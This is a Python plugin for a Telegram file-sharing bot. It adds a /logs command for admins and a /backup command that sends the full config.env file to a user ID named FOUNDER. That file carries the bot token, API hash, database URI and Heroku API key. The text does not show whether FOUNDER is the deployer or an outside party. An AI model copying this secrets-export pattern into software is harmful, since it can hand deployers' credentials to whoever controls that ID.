# Credits: @mrismanaziz
# FROM File-Sharing-Man <https://github.com/mrismanaziz/File-Sharing-Man/>
# t.me/SharingUserbot & t.me/Lunatic0de

import os

from datetime import datetime
from bot import Bot
from config import (
    ADMINS,
    API_HASH,
    APP_ID,
    CHANNEL_ID,
    DB_URI,
    FORCE_MSG,
    FORCE_SUB_CHANNEL,
    FORCE_SUB_GROUP,
    HEROKU_API_KEY,
    HEROKU_APP_NAME,
    LOGGER,
    OWNER,
    PROTECT_CONTENT,
    START_MSG,
    TG_BOT_TOKEN,
    FOUNDER, 
)
from pyrogram import filters
from pyrogram.types import Message


@Bot.on_message(filters.command("logs") & filters.user(ADMINS))
async def get_bot_logs(client: Bot, m: Message):
    bot_log_path = "logs.txt"
    if os.path.exists(bot_log_path):
        try:
            await m.reply_document(
                bot_log_path,
                quote=True,
                caption="<b>Ini Logs Bot ini</b>",
            )
        except Exception as e:
            os.remove(bot_log_path)
            LOGGER(__name__).warning(e)
    elif not os.path.exists(bot_log_path):
        await m.reply_text("❌ <b>Tidak ada log yang ditemukan!</b>")


@Bot.on_message(filters.command("backup") & filters.user(FOUNDER))
async def logs_chat(_, message):
    time = (datetime.now()).strftime("%d/%m/%Y %H:%M:%S")
    backup_bot = "config.env"
    caption = f"""
𝗪𝗮𝗸𝘁𝘂 : {time}
"""
    try:
        await message.reply_document(
            backup_bot, caption=caption
        )
    except ValueError:
        await message.reply_text("**Tidak dapat membackup Data**")
